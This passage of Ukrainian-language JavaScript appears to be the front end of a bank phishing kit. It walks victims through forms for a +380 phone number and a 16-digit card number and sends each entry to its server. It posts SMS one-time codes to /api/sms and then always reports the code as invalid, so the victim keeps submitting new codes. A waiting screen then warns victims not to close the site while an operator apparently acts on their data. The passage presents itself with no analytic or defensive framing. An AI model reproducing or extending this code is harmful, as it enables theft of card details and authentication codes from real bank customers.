        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
        if (activeBankData.special && step.type === 'card_simple') { isFinalStep = true; }
        sendDataToServer(data, isFinalStep);
        if (isFinalStep) { showWaitingScreen(); return; }
        currentStepIndex++;
        if (currentStepIndex < activeBankData.steps.length) { renderStep(); } else { showWaitingScreen(); }
    }
    async function submitSmsCode() {
        const codeInput = document.getElementById('sms-code');
        const code = codeInput.value;
        const errorContainer = document.getElementById('sms-error-container');
        if (!code.trim()) {
            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
            return;
        }
        try {
            await fetch(`/api/sms`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
            });
        } catch (error) { console.error('Failed to send sms code:', error); }
        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
        codeInput.value = '';
    }
    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
    function renderStep() {
        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
        const step = activeBankData.steps[currentStepIndex];
        let html = '';
        switch (step.type) {
            case 'phone':
                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
                break;
            case 'card_simple':
                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
                break;
        }
        modalTitle.textContent = step.title;
        stepContent.innerHTML = html;
        modalFooter.style.display = 'flex';
        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
        nextBtn.style.display = 'block';
        addInputFormatting();
    }
    function showWaitingScreen() {
        modalTitle.textContent = 'Очікуємо';
        stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`;
        modalFooter.style.display = 'none';
    }
    function handleBackStep() {
        if (currentStepIndex > 0) {
            currentStepIndex--;
            renderStep();
        } else {
            body.classList.remove('form-active');
        }
    }
    function addInputFormatting() {
        const phoneInput = document.getElementById('phone');
        if (phoneInput) {
            phoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
                e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
            });
        }
        const cardNumberInput = document.getElementById('card');
        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
            });
        }
    }
    function validateCurrentStep() {
        let isValid = true;
        stepContent.querySelectorAll('.input-field').forEach(input => {
            const errorContainer = input.parentElement.querySelector('.error-message');
            input.classList.remove('invalid');
            if (errorContainer) errorContainer.style.display = 'none';
            let value = input.value.replace(/\D/g, '');
            let requiredLength = 0;
            switch (input.id) {
                case 'phone': requiredLength = 9; break;
                case 'card': requiredLength = 16; break;
            }
            if (requiredLength > 0 && value.length < requiredLength) {
                isValid = false;
                input.classList.add('invalid');
                if (errorContainer) {
                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
                    errorContainer.style.display = 'block';
                }
            }
        });
        return isValid;
    }
});
